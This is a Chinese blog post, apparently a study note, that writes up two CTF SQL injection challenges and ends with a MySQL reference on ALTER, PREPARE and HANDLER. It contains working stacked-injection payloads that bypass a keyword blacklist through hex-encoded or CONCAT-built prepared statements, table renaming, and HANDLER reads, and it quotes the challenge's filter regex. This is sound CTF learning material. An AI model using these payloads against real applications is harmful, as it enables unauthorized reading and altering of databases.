---
title: 随便注|blacklist => 的一些知识
id: 随便注|blacklist
---

<!-- more -->

## 前言

最近刷题刷到 [强网杯2019]随便注 和 [GYCTF2020]Blacklist；
加深了一点对堆叠注入的理解，也了解到一些相关waf的简单bypass
算是对之前sqli学习的一些补充吧；后续也要对mysql进行深入的学习才行（毕竟这学期也有这门课程--）

## [强网杯2019]随便注

![](https://i.loli.net/2021/03/09/753fzuyAcqHebMO.png)

```mysql
堆叠注入：
1'; show databases;#	//库名
1'; show tables;#		//表名
1'; show columns from `1919810931114514`;# 	//字段；表名为数字时，要用反引号包起来查询。
```



### 解法1

预处理

select被过滤了，所以先将

```mysql
select * from ` 1919810931114514 `
```

进行16进制编码

再通过构造payload进而得到flag

```mysql
//1:利用预处理语句会进行编码转换，将sql语句转为十六进制
-1';
SeT @a = 0x73656c656374202a2066726f6d20603139313938313039333131313435313460;	
prepare execsql from @a;			
execute execsql;			

# set：设置变量名和值
# prepare…from…：预处理语句，会进行编码转换；且prepare用于预备一个语句，并赋予名称，之后可以引用该语句
# execute：执行由SQLPrepare创建的SQL语句
# ps：SELECT 可以在一条语句里对多个变量同时赋值,而 SET 只能一次对一个变量赋值

//2：利用concat()也可以0-0
-1';
Set @a = CONCAT('se','lect * from `1919810931114514`;');
prepare execsql from @a;
execute execsql;
```

 

### 解法2

修改表名列名

```mysql
1';
rename table words to word1;								# words 表更名为 word1
rename table  `1919810931114514` to words; 					# 1919810931114514 更名为 words 
alert table words add id int unsigned not Null auto_increment primary key; # 给新 words 表添加新的列名 id
alert table words change flag data varchar(100); #			# 将新word中的 flag 改名为 data 


#or：

1';
alter table words rename to words1;							# words 表更名为 word1
alter table `1919810931114514` rename to words;				# 1919810931114514 更名为 words
alter table words change flag id varchar(50);#				# 将新words 中的 flag 改名为 id
```

然后输入`1' or 1=1#`即可查看flag

## [GYCTF2020]Blacklist

基于随便注改的sql注入；打算联合查询的时候直接爆出了题目说的blacklist黑名单：

`("/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i",$inject)`

猜测后端语句为`select * from Table where inject = '$inject';`

 

爆字段数：`1' order by 2--+`

ban了select；不能直接联合查詢
ban了set和prepare；不能預编译
ban了alter和rename；不能改表名访问数据

 

```mysql
?inject=1' ;show tables--+`						#爆表
?inject=1' ;show columns from `FlagHere`--+		#爆列
```

###  解法3

利用handle方法读取

```mysql
1';
handler `FlagHere` open as `a`;
handler `a` read next;#
```

or

```mysql
1';
HANDLER FlagHere OPEN;
HANDLER FlagHere READ FIRST;
HANDLER FlagHere CLOSE;#
```



这的解法同样适用于随便注：

```mysql
1'; handler `1919810931114514` open as `a`; handler `a` read next;#
```







## 小结

随便注中所说`安全与开发缺一不可`，结合wp堆叠注入的利用确实发人深省；
堆叠注入本就是以分号闭合前面语句，后面的命令全靠自己对sql的命令了解程度。
wp中的三种解法都是需要对sql语句有一定了解才整的出的~

终究是重在积累，要搭好地基啊

![先随便建个库和表](https://i.loli.net/2021/03/09/UmXv1rDdRlbOk8T.png)



### alert

alter：修改已知表的列（ 添加：add | 修改：modify，change | 删除：drop）

- 添加列


```mysql
alter table "table_name" add "column_name" type [first|after "column_name"];
```

![](https://i.loli.net/2021/03/09/NsIdApcy2Ji8LKl.png)

- 删除列


```mysql
alter table "table_name" drop "column_name";
```

![](https://i.loli.net/2021/03/09/ChgRjNpH8X6icv1.png)

- 改表名

```mysql
alter table "table_name1" rename to "table_name2";
```

- 改变字段的数据类型

```mysql
alter table "table_name" modify "column_name" type;
//or
alter table "table_name" change "column_name" "column_name" type;
```

- 改字段名 

```mysql
alter table "table_name" change "column1" "column2" type;
```



### 预处理

（ps：mysql版本<4.1是不支持服务段预编译的）

```mysql
PREPARE stmt_name FROM preparable_stm					#预编译一条mysql语句
EXECUTE stmt_name [USING @var_name [, @var_name] ...]	#执行预编译的语句
{DEALLOCATE | DROP} PREPARE stmt_name					#释放预编译语句
# ps：当预编译条数达到阈值会报错
```

- eg1：将数据插入表中

```mysql
prepare try1 from 'insert into ttable1 select ?,?';		#此处1个?匹配1个变量
set @a=111,@b='hhh';
execute try1 using @a,@b;
```

![数据成功插入到表中](https://i.loli.net/2021/03/09/t3pIw8hciF4lf6V.png)

- eg2:查看表中信息

```mysql
set @a = 'select * from `ttable1`';
prepare try2 from @a;
execute try2;
```

![成功执行语句，查看表中数据](https://i.loli.net/2021/03/09/2hAOLzexfM8Wa1m.png)

- eg3:可以利用编码转换已经concat()组合，再ctf中绕过waf

```mysql
set @a = CONCAT('se','lect * from `ttable1`;');
//or set @a = 0x7365272c276c656374202a2066726f6d2060747461626c653160;
prepare try3 from @a;
execute try3;
```

- 释放：

```mysql
deallocate prepare try1;
```



### handle



```mysql
# handle语法：
HANDLER tbl_name OPEN [ [AS] alias]

HANDLER tbl_name READ index_name { = | <= | >= | < | > } (value1,value2,...)
 [ WHERE where_condition ] [LIMIT ... ]
HANDLER tbl_name READ index_name { FIRST | NEXT | PREV | LAST }
 [ WHERE where_condition ] [LIMIT ... ]
HANDLER tbl_name READ { FIRST | NEXT }
 [ WHERE where_condition ] [LIMIT ... ]

HANDLER tbl_name CLOSE
```

- `HANDLER tbl_name OPEN [ [AS] alias]`:
  打开一张表（不返回结果，但声明了一个句柄，句柄名通过可选项alias控制，否则默认为表名）
  `HANDLER tbl_name CLOSE`：关闭打开的句柄

- 创建索引：`CREATE INDEX index_name ON tbl_name（cln_name）`
  （INDEX为索引类型，也可以是char、varchar等等）

- 通过指定索引`HANDLER tbl_name READ index_name = value`，指定从哪一行开始
  通过NEXT继续浏览，若指定一个值则从该值对应索引一行开始
  （ps：按照索引查看时，会由索引对应的字段 升序 返回表信息）
  `HANDLER tbl_name READ index_name { FIRST | NEXT | PREV | LAST }`:
  `first`获取第一行内容；`last`获取最后一行内容
  `next`获取索引后一行的内容；`prev`获取索引前面一行的内容

- `HANDLER tbl_name READ { FIRST | NEXT }`：
  同上，`first`获取第一行；`next`以此访问下一行

- 也可利用where和limit子句添加条件

官方文档：（使用页面翻译--可能不太准确）

![官方文档](https://i.loli.net/2021/03/09/4qavKBciRZ2VAne.png)

> sql约束：用以规定表中数据的规则
> ![](https://i.loli.net/2021/03/09/8qAgPSLMfV2RIN9.png)

